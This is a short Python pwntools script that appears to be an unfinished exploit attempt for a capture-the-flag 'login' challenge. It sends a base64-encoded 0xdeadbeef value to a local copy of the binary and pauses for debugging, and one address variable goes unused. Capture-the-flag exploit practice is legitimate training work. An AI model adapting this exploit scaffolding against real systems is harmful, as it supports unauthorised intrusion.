#!/usr/bin/env python
from pwn import *
import time
import random
import base64

# "0xdeadbeef" in binary 
deadbeef_addr = 0x8049272

#############################
exe = ELF("login")

#r = remote('pwnable.kr', 9002)
r = process("./login")

# print menu
print r.recvuntil(": ")

# payload
payload = p32(0xdeadbeef)

# encode payload
e_payload = base64.b64encode(payload)


raw_input("debug")
# send paylaod
r.sendline(e_payload)

r.interactive()
